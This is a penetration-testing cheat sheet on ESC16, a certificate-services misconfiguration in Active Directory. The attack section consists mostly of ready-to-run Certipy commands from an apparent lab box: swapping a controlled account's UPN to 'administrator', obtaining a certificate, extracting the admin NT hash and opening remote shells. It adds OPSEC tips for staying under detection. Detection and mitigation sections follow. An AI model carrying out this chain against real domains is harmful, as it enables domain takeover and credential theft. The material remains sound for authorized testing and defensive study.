---
title: "ESC16 — Security Extension Disabled on CA (Globally)"
description: "ESC16 was introduced with Certipy v5 by Oliver Lyak and is one of the newest ADCS attack techniques. The vulnerability exists when the CA has been…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs"]
tools: ["Certipy", "BloodHound", "Evil-WinRM", "faketime", "Certify"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC16 — Security Extension Disabled on CA (Globally).md"
---
# ESC16 — Security Extension Disabled on CA (Globally)

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | CA-Level Configuration Abuse |
| **Difficulty** | Medium |
| **Pre-requisites** | `szOID_NTDS_CA_SECURITY_EXT` in CA `DisableExtensionList` + GenericWrite on enrollable account |
| **Tools** | Certipy v5+, BloodHound |
| **OPSEC Noise** | Medium — UPN swap generates 4738 events |
| **One-liner** | CA globally disables SID security extension → KDC falls back to UPN matching → swap controlled account's UPN to `administrator` → request cert → authenticate as admin. |

***

ESC16 was introduced with **Certipy v5** by Oliver Lyak and is one of the newest ADCS attack techniques. The vulnerability exists when the CA has been configured to globally disable the `szOID_NTDS_CA_SECURITY_EXT` extension (`1.3.6.1.4.1.311.25.2`) — also known as the **SID security extension**. This extension was Microsoft's patch response to Certifried (CVE-2022-26923) — it embeds the requester's `objectSid` into every issued certificate, allowing the KDC to perform strong certificate binding and verify that the certificate identity matches the AD object.

When this extension is **disabled at the CA level**, every single certificate issued by that CA lacks the SID binding — making the KDC fall back to **UPN-based authentication** for all certificates. This means the KDC trusts whatever UPN is embedded in the cert without verifying the objectSid — and since you can temporarily swap a controlled account's UPN to `administrator`, you can get a legitimately CA-signed certificate that the DC accepts as proof you are Administrator.

This is effectively **ESC6's post-patch bypass** — it achieves the same outcome through a different mechanism.

***

## The Core Mechanism

The CA stores disabled extensions in a registry key:

```
HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA-NAME>\PolicyModules\
CertificateAuthority_MicrosoftDefault.Policy
DisableExtensionList = 1.3.6.1.4.1.311.25.2
```

When `szOID_NTDS_CA_SECURITY_EXT` is in this list, **no certificate issued by this CA will ever contain a SID extension** — regardless of template configuration, regardless of StrongCertificateBindingEnforcement settings on the KDC. The SID extension simply never gets embedded at issuance time.

***

## Required Conditions

| Condition | Where to Check |
|-----------|----------------|
| `szOID_NTDS_CA_SECURITY_EXT` in CA's `DisableExtensionList` | CA output: `Security Extension: Disabled` |
| You have **`GenericWrite` or `WriteProperty`** over at least one domain account | BloodHound ACE edges / certipy output |
| That account can **enroll** in a Client Auth template | Template `Enrollment Rights` includes the account or its group |
| `Request Disposition: Issue` | CA config |

> 💡 The `GenericWrite` account does **not** need to be privileged. On Fluffy, you had `GenericWrite` over `ca_svc` — a service account, not an admin. That was enough.

***

## Step 0 — Enumeration

```bash
# Standard scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash (PtH) — format is -hashes :NTHASH  (leading colon = empty LM)
certipy-ad find -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -dc-ip $TARGET -vulnerable -stdout
```

> [!bug] `cannot import name 'asn1' from 'cryptography.hazmat'`
> This is **not** a command error — Certipy v5 needs a newer `cryptography` than the stale one in `~/.local`. Certipy runs but every operation dies on import. Fix by reinstalling Certipy in an isolated environment so it pulls its own dependency set:
> ```bash
> pipx install certipy-ad        # or: uv tool install certipy-ad
> ```
> If you must keep the system install, upgrade the shadowing library: `pip install --user --upgrade 'cryptography>=44' asn1crypto`. Confirm with `certipy-ad version`.

### What Vulnerable ESC16 Output Looks Like

```
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Web Enrollment
      HTTP  Enabled                     : False     ← ESC8 not available
      HTTPS Enabled                     : False
    User Specified SAN                  : Disabled  ← ESC6 not available
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled   ← ESC11 not available

    [!] Vulnerabilities
      ESC16 : Security extension is disabled.
```

> 💡 This is **exactly what Fluffy showed** — ESC8, ESC6 and ESC11 all closed off, but ESC16 present. The CA had the SID extension globally disabled.

***

## Full Attack Chain — Linux (Certipy v5.1.0)

The attack is a **4-step chain**: read + hijack the UPN → request the cert as the controlled account → restore the UPN → authenticate. Commands below use the real Fluffy values (`winrm_svc` hash `33bd09...`, `ca_svc` hash `ca0f4f...`).

> [!warning] `account` actions are `create` / `read` / `update` / `delete`
> There is **no `lookup` action**. Use `read` to view an account and `update` to change it. The action is a positional argument at the **end** of the command, and `-user <SAM>` is required.

***

### Step 1 — Read, then hijack ca_svc's UPN

You need write over the controlled account's `userPrincipalName` (here `winrm_svc` can write `ca_svc`), and `ca_svc` must be able to enrol in a Client Auth template (e.g. `User`).

```bash
# Read the current UPN first so you can restore it exactly
certipy-ad account -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -dc-ip $TARGET -user ca_svc read
```

```bash
# Set ca_svc's UPN to the target identity
certipy-ad account -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -dc-ip $TARGET -user ca_svc -upn administrator update
```

> [!warning] Do Step 2 immediately
> The UPN swap is a live AD change. Request the cert right away, then restore in Step 3 to avoid breaking `ca_svc` auth or tripping detection.

***

### Step 2 — Request a certificate as ca_svc

Enrol as `ca_svc` (whose UPN is now `administrator`) in a Client Auth template. Because the CA strips the SID extension (ESC16), the issued cert maps by UPN, so it authenticates as Administrator.

```bash
certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 \
  -dc-ip $TARGET -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
# → Got certificate with UPN 'administrator' ; saved administrator.pfx
```

***

### Step 3 — Restore the UPN (clean up / avoid breaking auth)

```bash
certipy-ad account -u 'winrm_svc@fluffy.htb' -hashes 33bd09dcd697600edf6b3a7af4875767 \
  -dc-ip $TARGET -user ca_svc -upn ca_svc@fluffy.htb update
```

> [!tip] The cert stays valid
> Restoring the UPN does **not** invalidate `administrator.pfx` — the identity is locked in at signing time. You keep a working admin cert.

***

### Step 4 — Authenticate with the cert for the admin NT hash

```bash
certipy-ad auth -dc-ip $TARGET -pfx administrator.pfx -u administrator -domain fluffy.htb
# → Got hash for 'administrator@fluffy.htb': aad3b435...:8da83a3fa618b6e3a00e93f676c92a6e
```

> [!warning] Clock skew (Fluffy)
> `certipy auth` uses PKINIT and does **not** self-correct skew. If it throws `KRB_AP_ERR_SKEW`, prefix `faketime` (see faketime-cheatsheet) or sync your clock: `sudo rdate -n $TARGET`.
> ```bash
> faketime -f '+7h' certipy-ad auth -dc-ip $TARGET -pfx administrator.pfx -u administrator -domain fluffy.htb
> ```

***

### Step 5 — Shell

```bash
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.fluffy.htb
```

```bash
evil-winrm -i $TARGET -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

***

## ESC16 Visual Attack Flow (Fluffy-style)

```
[winrm_svc has GenericWrite over ca_svc]
            │
            │  certipy account -user ca_svc -upn administrator update
            ▼
[ca_svc.userPrincipalName = "administrator"]  ← Temporary
            │
            │  certipy req -u ca_svc -template User
            │  CA issues cert — reads UPN = "administrator"
            │  No SID extension embedded (ESC16)
            ▼
[administrator.pfx] ← Signed by CA with UPN = administrator
            │
            │  certipy account -user ca_svc -upn ca_svc@fluffy.htb update
            ▼
[UPN restored — clean] ← cert still valid forever
            │
            │  certipy auth -pfx administrator.pfx
            ▼
[TGT + NT Hash for Administrator]
            │
            ▼
      [DOMAIN OWNED]
```

***

## ESC16 vs ESC9 — The Relationship

ESC16 is the CA-level version of ESC9. The difference:

| | ESC9 | ESC16 |
|---|---|---|
| **Where flag is set** | Per-template: `CT_FLAG_NO_SECURITY_EXTENSION` | **CA-wide: `DisableExtensionList`** |
| **Templates affected** | Only templates with the flag | **Every template on that CA** |
| **Certipy detects as** | ESC9 on specific template | ESC16 on CA object |
| **Attack chain** | UPN swap → req → restore | UPN swap → req → restore (identical) |
| **Introduced** | SpecterOps 2021 | **Oliver Lyak, Certipy v5, 2024** |

***

## ESC16 vs ESC6 — Post-Patch Equivalence

| | ESC6 | ESC16 |
|---|---|---|
| **Mechanism** | CA accepts user-specified SAN at enrollment | CA doesn't embed SID — KDC falls back to UPN matching |
| **Post-KB5014754** | Blocked if `StrongCertificateBindingEnforcement = 2` | ✅ **Still works** — SID is never in cert so enforcement is bypassed at source |
| **Requires UPN swap** | ❌ — inject SAN directly | ✅ — must temporarily swap UPN |
| **Modern relevance** | Largely historical | ✅ **Current and dangerous** |

***

## Detection Indicators

- **Event ID 4738** — User account changed — specifically watch for `userPrincipalName` attribute being modified on service or machine accounts
- **Rapid pair of 4738 events** — UPN changed then immediately changed back within seconds is the ESC16 fingerprint
- **Event ID 4887** — Certificate issued where the UPN in the cert differs from the account's permanent UPN in AD
- **CA registry audit** — Alert on any modification to the `DisableExtensionList` registry value
- **BloodHound** — `GenericWrite` edges from low-priv principals to accounts with enrollment rights are the pre-condition indicator

***

## Mitigation

- **Remove `szOID_NTDS_CA_SECURITY_EXT` from `DisableExtensionList`** — this is the direct fix; the SID extension must be re-enabled:
  ```powershell
  # On the CA server
  certutil -setreg CA\DisableExtensionList -
  net stop certsvc && net start certsvc
  ```
- **Set `StrongCertificateBindingEnforcement = 2`** on all DCs — enforces SID validation on cert auth
- **Audit `GenericWrite` ACEs** — Any low-priv principal with `GenericWrite` over an account that can enroll in auth templates is a pre-condition for ESC16
- **Monitor UPN changes** on accounts that hold enrollment rights — UPN modifications are rare and should always alert
- **Re-issue all certificates** after enabling the SID extension — existing certs without objectSid remain exploitable until they expire

***

## OPSEC Considerations

| Action | Event Generated | Noise Level |
|--------|----------------|-------------|
| UPN swap on controlled account | Event ID 4738 (User Account Changed) | 🟡 Medium |
| Certificate request | Event ID 4887 on CA | 🟢 Low |
| UPN restore | Event ID 4738 (second occurrence) | 🟡 Medium |
| PKINIT authentication | Event ID 4768 (TGT request) | 🟢 Low |

> ⚠️ The **rapid pair of 4738 events** (UPN changed → UPN restored within seconds) is the primary detection fingerprint. Minimize the time between Steps 3–5. The certificate request itself is low-noise since it goes through a legitimate template.

***

## References

- [ESC16 — SpecterOps GhostPack Docs](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc16-security-extension-disabled-on-certificate-authority)
- [Certipy v5 Release & ESC16 — Oliver Lyak](https://github.com/ly4k/Certipy/discussions/270)
- [ADCS ESC16 — Hacking Articles](https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/)
- [Certipy Privilege Escalation Wiki](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [Active Directory Certificate ESC Attacks — InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-esc/)
- [Fortifying ADCS Against Exploitation — NCC Group](https://www.nccgroup.com/research/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/)
